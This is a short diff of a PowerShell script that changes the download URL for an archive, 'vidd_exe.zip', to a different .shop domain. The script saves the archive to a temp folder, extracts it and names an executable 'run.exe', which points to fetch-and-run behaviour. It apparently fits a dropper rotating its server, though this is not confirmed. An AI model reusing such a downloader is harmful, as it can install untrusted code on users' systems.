@@ -22,7 +22,7 @@ if (Test-Path $extractFolder) {
     Remove-Item -Path $extractFolder -Recurse -Force
 }
 
-$downloadURL = "https://www.api-qsr.shop/vidd_exe.zip"
+$downloadURL = "https://www.qsrtools.shop/vidd_exe.zip"
 $archiveFile = "$env:TEMP\vidd_exe.zip"
 $extractFolder = "C:\vidd_exe"
 $exeName = "run.exe"
@@ -98,3 +98,4 @@ if ($Host.Name -eq 'ConsoleHost') {
 } else {
     Start-Sleep -Seconds 10
 }
+
